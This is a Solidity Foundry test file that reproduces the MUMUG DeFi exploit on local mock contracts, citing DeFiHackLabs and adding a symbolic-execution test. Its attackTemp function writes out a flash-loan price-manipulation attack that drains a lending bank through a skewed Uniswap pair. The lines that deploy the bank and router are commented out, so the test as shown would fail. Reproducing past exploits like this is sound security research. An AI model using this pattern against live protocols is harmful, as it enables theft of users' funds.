// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";
import "@utils/USDC_e.sol";
import "@utils/QueryBlockchain.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

import "./MuBank.sol";

contract MUMUGTest is Test, BlockLoader {
    MuBank bank;
    ERC20Basic mu;
    USDC_e usdc_e;
    // USDC_e to MU
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;

    address constant owner = 0x3D87AD5D1686e240aBA58775a76B376d5CddDA3B;

    // Load from cheats.createSelectFork("Avalanche", 23435294);
    uint256 totalSupplyUSDC_e = 193102891951559;
    uint256 totalSupplyMU = 2000000000000000000000000;

    uint112 reserve0 = 110596398651;
    uint112 reserve1 = 172739951491310439336991;
    uint32 blockTimestampLast = 1670632626;
    uint256 kLast = 19102449214934407600169207587014640;
    uint256 price0CumulativeLast =
        308814746138342549066779453499621908384171319637193787;
    uint256 price1CumulativeLast = 108977737583418847522328147893;

    uint256 pairBalance0 = 110596398651;
    uint256 pairBalance1 = 172739951491310439336991;

    uint256 bankBalanceMU = 100000 * 10e18;

    function setUp() public {
        vm.startPrank(owner);
        // Initial Tokens
        // Dont change the order of contract initialization.
        mu = new ERC20Basic(totalSupplyMU);
        usdc_e = new USDC_e();

        // emit log_named_address("USDC Address", address(usdc_e));
        // emit log_named_address("MU Address", address(mu));
        // emit log_string("");

        // Initial Uniswap;
        pair = new UniswapV2Pair(
            address(usdc_e),
            address(mu),
            reserve0,
            reserve1,
            blockTimestampLast,
            kLast,
            price0CumulativeLast,
            price1CumulativeLast
        );
        // usdc_e.transfer(address(pair), pairBalance0);
        // mu.transfer(address(pair), pairBalance1);
        // // address pair0 = address(pair);
        // // factory = new UniswapV2Factory(address(0xdead), pair0, address(0x0), address(0x0));
        // // router = new UniswapV2Router(address(factory), address(0xdead));

        // // Initial Bank
        // bank = new MuBank(address(router), address(pair), address(mu));
        // mu.transfer(address(bank), bankBalanceMU);

        vm.stopPrank();

        // vm.label(address(bank), "Bank");
        // vm.label(address(mu), "MU");
        // vm.label(address(usdc_e), "USDC_e");
        // vm.label(address(router), "Router");
        // vm.label(address(pair), "Pair");
    }

    function self() public view returns (address) {
        return address(this);
    }

    function print(string memory tips) public {
        emit log_string(tips);
        address attacker = self();
        address pair_ = address(pair);
        address bank_ = address(bank);
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), attacker, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), attacker, mu.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), pair_, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), pair_, mu.decimals());
        emit log_string("");
        emit log_string("Bank Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), bank_, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), bank_, mu.decimals());
        emit log_string("");
        emit log_string("");
    }

    function flashLoanBorrow(uint256 amount) internal {
        deal(address(mu), self(), amount);
    }

    function flashLoanPayback(uint256 amount) internal {
        mu.transfer(address(0xdead), amount);
    }

    function swapUSDCToMUByPair(uint256 sendAmount) internal {
        usdc_e.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdc_e);
        path[1] = address(mu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sendAmount,
            1,
            path,
            self(),
            block.timestamp
        );
    }

    function swapMUToUSDCByPair(uint256 sendAmount) internal {
        mu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(mu);
        path[1] = address(usdc_e);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sendAmount,
            1,
            path,
            self(),
            block.timestamp
        );
    }

    function swapUSDCToMUByBank(uint256 sendAmount) internal {
        usdc_e.approve(address(bank), type(uint).max);
        bank.mu_bond(address(usdc_e), sendAmount);
    }

    function testExploit() public {
        uint256 flashloanAmount = (mu.balanceOf(address(bank)) * 990) / 1000;
        uint256 swapAmount = flashloanAmount;
        uint256 sendAmount = 946 * 10e18;
        attackTemp(flashloanAmount, swapAmount, sendAmount);
        require(usdc_e.balanceOf(self()) >= 10e6, "Attack failed!");
    }

    function testSymbolic(
        uint256 flashloanAmount,
        uint256 swapAmount,
        uint256 sendAmount
    ) public {
        attackTemp(flashloanAmount, swapAmount, sendAmount);
        require(usdc_e.balanceOf(self()) < 10e6, "Attack succeed!");
    }

    function attackTemp(
        uint256 flashloanAmount,
        uint256 swapAmount,
        uint256 sendAmount
    ) public {
        // This attack is different from the original one:
        // https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MUMUG_exp.sol
        // I de-couple two attacks from it.
        print("Before exploit: ");

        // Step 1, mock to flashloan MU.
        flashLoanBorrow(flashloanAmount);

        // Step 2, swap MU to USDC_e at uniswapPair, it will manipulate the price of MU/USDC_e in MU bank.
        swapMUToUSDCByPair(swapAmount);

        // print("After swap1: ");

        // Step 3, do the manipulated sell of MU.
        uint256 muAmount;
        (, muAmount) = bank.mu_bond_quote(sendAmount);
        swapUSDCToMUByBank(sendAmount);

        // print("After swap2: ");

        uint256 paybackAmount = (flashloanAmount * 1000) / 997;

        // Step 4, payback the flashloan.
        // require(
        //     muAmount >= paybackAmount,
        //     "MU token isn't enough to payback flashloan!"
        // );
        flashLoanPayback(paybackAmount);

        print("After exploit: ");
    }
}
